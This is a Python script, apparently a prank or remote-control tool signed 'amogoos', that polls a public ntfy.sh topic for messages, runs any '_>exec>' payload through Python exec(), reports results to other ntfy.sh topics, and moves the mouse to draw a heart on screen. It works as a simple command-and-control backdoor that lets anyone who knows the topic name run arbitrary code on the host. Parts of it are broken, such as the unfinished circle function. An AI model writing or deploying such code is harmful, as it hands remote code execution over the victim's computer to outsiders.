from threading import Thread
from time import sleep
import requests as req
import datetime as dt
import os
import pyautogui as pgui
import math
import json
import pynput.mouse as Mouse
import pynput.keyboard as Keyboard


global mouse
mouse = Mouse.Controller()
global keyboard
keyboard = Keyboard.Controller()
Button = Mouse.Button
Key = Keyboard.Key

def on_move(x,y): pass
def on_click(x,y,button,pressed): pass
mlistener = Mouse.Listener(on_move=on_move, on_click=on_click)
def on_press(key): pass
def on_release(key): pass
klistener = Keyboard.Listener(on_press=on_press, on_release=on_release)


global priorities
priorities = {
    'error': 1,
    'info': 1,
    'merror':3,
    'exec':2,
    'draw':2

}
global screenSize
screenSize = pgui.size()



#def circle(radius,start=0,end=360,margin=5):
#    print('circ')
#    angle=start
#    mouse.press(Button.left)
#    for i in range(start,end):
#        print(i)
#        x=radius*math.cos(angle)
#        y=radius*math.sin(angle)
#        print(x,y)
#        mouse.move(x,y)
#        angle+=1
#        sleep(1)
#    mouse.release(Button.left)
#    print('circle')

def cir(x,r):
    return math.sqrt(x**2 - r**2)

def circle(radius):
    cx, cy = mouse.position
    lst = []
    for i in range(0,360):
        lst.append(cir(r,))

def heart():
    try:
        print('h')
        k=10
        cx, cy = mouse.position
        positions=[
            (-5,-5),
            (-5,0),
            (-5,5),
            (0,5),
            (5,5),
            (10,15),
            (10, -15),
            (5, -5),
            (0, -5),
            (-5,-5),
            (-5,0),
            (-5,5)]
        mouse.press(Button.left)
        for x,y in positions:
            print(x*k,y*k)
            mouse.move(x*k,y*k)
        mouse.release(Button.left)
    except Exception as e: print(e)


global patterns
patterns = {
    'heart': heart
}


def draw(pattern, x=screenSize[0]/2, y=screenSize[1]/2, s=1):
    try:
        cx, cy = mouse.position
        x=float(x)
        y=float(y)
        if x==-1: x=cx
        elif x==-2: x=screenSize[0]/2
        if y==-1: y=cy
        elif y==-2: y=screenSize[1]/2
        x=max(200,x)
        y=max(200,y)



    except KeyboardInterrupt: raise KeyboardInterrupt
    except Exception as e:
        send(f'Exception: {e} @draw', 'error', priorities['error'])


def threadrun(func, daemon=True):
    th=Thread(target=func, daemon=daemon).start()
    send(f'Started thread {func.__name__}', '', priorities['info'])

def gettime():
    return dt.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

def send(msg, title='', priority=1, channel='https://ntfy.sh/amogoos-OUT'):
    try:
        req.post(channel,
                      data=f'{msg}',
                      headers={
                          "Title": f'{title}',
                          "Priority": f'{priority}',
                      })
    except UnicodeEncodeError: send('Text contains cyrillic', 'Error sending a msg', priorities['error'])

def ntfylisten(channel='https://ntfy.sh/amogoos-IN'):
    resp = req.get(channel+'/json', stream=True)
    for line in resp.iter_lines():
        if line:
            msghandle(json.loads(line))

def dexec(cmd):
    try:
        send(f'Executing {cmd}', 'Exec', priorities['exec'])
        exec(cmd)
    except KeyboardInterrupt: raise KeyboardInterrupt
    except Exception as e:
        send(f'Error during exec {e}', 'ExecError', priorities['error'])

def msghandle(msg):
    try:
        if msg['event'] == 'message':
            print(msg)
            send(f"Received '{msg['message']}'", 'test', priorities['info'], 'https://ntfy.sh/amogoos-UPDOWN')
            msg = msg['message']
            print(msg)
            if msg[0] == '_':
                msg = msg.split('>')
                if msg[1] == 'exec':
                    cmd = ''.join(msg[2:])
                    dexec(cmd)
                if msg[1] == 'draw':
                    drw = ''.join(msg[2:])
                    if '/' in drw:
                        x,y,s = drw.split('/')[1:]
                    pat = drw.split('/')[0]
                    print(f'{pat=}, {x=}:{y=}({s=})')
                    draw(pat,x,y,s)
    except KeyboardInterrupt: raise KeyboardInterrupt
    except Exception as e: send(f'Exception: {e} @msghandle', 'error', priorities['error'])


threadrun(ntfylisten, False)
print('ready')
sleep(2)
print('go')
heart()
print('Good luck, amogoos')
while True: pass